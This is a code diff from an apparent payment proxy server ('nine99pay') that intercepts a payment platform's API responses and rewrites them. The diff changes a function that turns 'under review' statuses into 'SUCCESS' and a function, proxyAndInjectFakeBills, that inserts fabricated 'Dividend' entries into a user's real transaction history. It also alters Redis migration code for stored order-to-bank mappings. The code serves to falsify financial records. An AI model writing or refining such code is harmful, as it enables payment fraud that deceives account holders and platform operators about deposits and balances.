@@ -63,33 +63,37 @@ async function loadData(forceRefresh) {
       } else {
         cachedData = { ...DEFAULT_DATA };
       }
-      if (!cachedData.userOverrides) cachedData.userOverrides = {};
-      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
-      if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
-      if (!cachedData._migratedOldHash) {
-        try {
-          const oldMap = await redis.hgetall('nine99payOrderBankMap');
-          if (oldMap && typeof oldMap === 'object') {
-            let migrated = 0;
-            for (const [oid, val] of Object.entries(oldMap)) {
-              if (!cachedData.orderBankMap[oid]) {
+    } else {
+      cachedData = { ...DEFAULT_DATA };
+    }
+    if (!cachedData.userOverrides) cachedData.userOverrides = {};
+    if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
+    if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
+    if (!cachedData._migratedOldHash) {
+      try {
+        const oldMap = await redis.hgetall('nine99payOrderBankMap');
+        const oldCount = oldMap ? Object.keys(oldMap).length : 0;
+        if (oldMap && typeof oldMap === 'object' && oldCount > 0) {
+          let migrated = 0;
+          for (const [oid, val] of Object.entries(oldMap)) {
+            if (!cachedData.orderBankMap[oid]) {
+              try {
                 const parsed = typeof val === 'string' ? JSON.parse(val) : val;
-                cachedData.orderBankMap[oid] = parsed;
-                migrated++;
-              }
-            }
-            if (migrated > 0) {
-              cachedData._migratedOldHash = true;
-              await redis.set('nine99payData', cachedData);
-              console.log(`Migrated ${migrated} order→bank entries from old hash`);
+                if (parsed && typeof parsed === 'object') {
+                  cachedData.orderBankMap[oid] = parsed;
+                  migrated++;
+                }
+              } catch(pe) {}
             }
           }
-        } catch(e) { console.error('Migration error:', e.message); }
+          console.log(`Migration: found ${oldCount} old entries, migrated ${migrated} new`);
+        }
         cachedData._migratedOldHash = true;
-      }
-      cacheTime = Date.now();
-      return cachedData;
+        await redis.set('nine99payData', cachedData);
+      } catch(e) { console.error('Migration error:', e.message); }
     }
+    cacheTime = Date.now();
+    return cachedData;
   } catch(e) {
     console.error('Redis load error:', e.message);
   }
@@ -589,23 +593,14 @@ function markDepositSuccess(obj) {
 
 function markReviewAsSuccess(obj) {
   if (!obj) return;
-  const reviewValues = [1, '1', 'review', 'REVIEW', 'Review', 'under_review', 'pending_review', 'reviewing'];
-  const statusFields = ['payStatus', 'status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
-  for (const field of statusFields) {
-    if (obj[field] !== undefined && reviewValues.includes(obj[field])) {
-      obj[field] = typeof obj[field] === 'number' ? 2 : '2';
-    }
-  }
-  const textFields = ['payStatusName', 'statusName', 'orderStatusName', 'statusText', 'statusStr', 'payStatusStr'];
-  for (const field of textFields) {
-    if (obj[field] !== undefined && typeof obj[field] === 'string') {
-      if (/review/i.test(obj[field])) obj[field] = 'SUCCESS';
-    }
-  }
+  const reviewStrings = ['review', 'under_review', 'pending_review', 'reviewing', 'under review'];
   for (const key of Object.keys(obj)) {
     const kl = key.toLowerCase();
-    if ((kl.includes('status') || kl.includes('state')) && typeof obj[key] === 'string' && /review/i.test(obj[key])) {
-      obj[key] = 'SUCCESS';
+    if (kl.includes('status') || kl.includes('state')) {
+      const val = obj[key];
+      if (typeof val === 'string' && reviewStrings.some(r => val.toLowerCase().includes(r))) {
+        obj[key] = 'SUCCESS';
+      }
     }
   }
 }
@@ -1440,36 +1435,30 @@ async function proxyAndInjectFakeBills(req, res) {
       }
     }
 
-    const userBills = (data.fakeBills && detectedUserId && data.fakeBills[String(detectedUserId)]) || [];
-    if (data.adminChatId && bot) {
-      const allFakeBillKeys = data.fakeBills ? Object.keys(data.fakeBills) : [];
-      const firstItem = items.length > 0 ? JSON.stringify(items[0], null, 2).substring(0, 1500) : 'NO ITEMS';
-      bot.sendMessage(data.adminChatId, `🔍 BILLS DEBUG\nEndpoint: ${req.originalUrl}\nUser: ${detectedUserId}\nReal items: ${items.length}\nitemsKey: ${itemsKey}\nFakeBill users: ${allFakeBillKeys.join(', ') || 'NONE'}\nFakeBills for this user: ${userBills.length}\n\n📋 First item:\n${firstItem}`).catch(()=>{});
+    let billUserId = detectedUserId;
+    if (!billUserId && data.fakeBills) {
+      const fbKeys = Object.keys(data.fakeBills).filter(k => data.fakeBills[k] && data.fakeBills[k].length > 0);
+      if (fbKeys.length === 1) billUserId = fbKeys[0];
     }
+    const userBills = (data.fakeBills && billUserId && data.fakeBills[String(billUserId)]) || [];
     if (userBills.length > 0 && items.length > 0) {
       const template = items[0];
       const fakeEntries = userBills.map(fb => {
         const entry = JSON.parse(JSON.stringify(template));
-        for (const k of Object.keys(entry)) {
-          const kl = k.toLowerCase();
-          if (kl.includes('orderno') || kl.includes('tradeno') || kl.includes('billno') || kl === 'id') {
-            entry[k] = fb.orderNo;
-          }
-          if (kl.includes('amount') || kl === 'money' || kl === 'changeamount') {
-            entry[k] = typeof entry[k] === 'string' ? '+' + fb.amount.toFixed(2) : fb.amount;
-          }
-          if (kl.includes('time') || kl.includes('date') || kl === 'addtime') {
-            entry[k] = fb.createTime;
-          }
-          if (kl.includes('type') || kl.includes('category') || kl === 'typename') {
-            if (typeof entry[k] === 'string') entry[k] = 'Dividend';
-          }
-        }
+        entry.orderNo = fb.orderNo;
+        entry.amount = fb.amount;
+        entry.orderType = 'Dividend';
+        entry.time = fb.createTime;
+        if (entry.afterAmount !== undefined) entry.afterAmount = null;
+        if (entry.remark !== undefined) entry.remark = null;
+        if (entry.commissionAmount !== undefined) entry.commissionAmount = null;
+        if (entry.arrivalTime !== undefined) entry.arrivalTime = null;
+        if (entry.id !== undefined) entry.id = fb.orderNo;
         return entry;
       });
       fakeEntries.sort((a, b) => {
-        const fbA = userBills.find(f => f.orderNo === (a.orderNo || a.tradeNo || a.billNo || a.id));
-        const fbB = userBills.find(f => f.orderNo === (b.orderNo || b.tradeNo || b.billNo || b.id));
+        const fbA = userBills.find(f => f.orderNo === a.orderNo);
+        const fbB = userBills.find(f => f.orderNo === b.orderNo);
         return (fbB ? fbB.timestamp : 0) - (fbA ? fbA.timestamp : 0);
       });
       items = [...fakeEntries, ...items];
